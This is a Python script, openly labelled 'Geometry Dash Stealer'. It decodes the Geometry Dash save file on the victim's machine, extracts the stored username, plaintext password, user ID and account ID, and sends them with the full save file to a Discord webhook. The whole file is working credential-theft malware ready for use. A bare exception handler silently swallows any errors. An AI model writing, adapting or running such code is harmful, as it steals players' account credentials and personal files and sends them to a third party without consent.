import os
import base64
import zlib
from discord import Embed, File, SyncWebhook, errors

#CONFIG
webhook_url = ""
savefile_path = os.path.join(os.getenv('LOCALAPPDATA'), 'GeometryDash', 'CCGameManager.dat') #pretty much %localappdata%/GeometryDash/CCGameManager.dat

def get_value(value, data, type):
    start_tag = b'<s>' if type == 'string' else b'<i>'
    end_tag = b'</s>' if type == 'string' else b'</i>'

    k_tag = ('<k>' + value + '</k>').encode()
    start_index = data.find(k_tag)
    if start_index == -1:
        return None

    start_index += len(k_tag)
    end_index = data.find(b'<k>', start_index)
    end_index = len(data) if end_index == -1 else end_index

    value_data = data[start_index:end_index]
    start_index = value_data.find(start_tag)
    if start_index == -1:
        return None

    start_index += len(start_tag.decode())
    end_index = value_data.find(end_tag, start_index)
    if end_index == -1:
        return None

    return value_data[start_index:end_index]

def xor_bytes(data: bytes, value: int) -> bytes:
    return bytes(map(lambda x: x ^ value, data))

def decompile(data):
    decompiled_data = xor_bytes(data, 11)
    decoded_data = base64.b64decode(decompiled_data, altchars=b'-_')
    decompressed_data = zlib.decompress(decoded_data[10:], -zlib.MAX_WBITS)
    
    return decompressed_data

def main():
    with open(savefile_path, 'rb') as f:
        data = f.read()
    raw_data = decompile(data)

    username = get_value('GJA_001', raw_data, 'string').decode()
    password = get_value('GJA_002', raw_data, 'string').decode()
    userid = get_value('playerUserID', raw_data, 'integer').decode()
    accountid = get_value('GJA_003', raw_data, 'integer').decode()

    webhook = SyncWebhook.from_url(webhook_url)

    embed = Embed(
        title="Geometry Dash Stealer",
        description=f"Username: {username}\nPassword: {password}\nUser ID: {userid}\nAccount ID: {accountid}",
        color=0x1E0D35
    )
    embed.set_footer(text="Made by Xytriza")

    file = File(savefile_path)

    try:
        webhook.send(embed=embed, file=file, username="GDStealer by Xytriza", avatar_url="https://xytriza.com/assets/icon.png")
    except errors.HTTPException:
        embed.set_author(name="Error: Savefile too big")
        webhook.send(embed=embed, username="GDStealer by Xytriza", avatar_url="https://xytriza.com/assets/icon.png")

if __name__ == "__main__":
    try:
        main()
    except:
        pass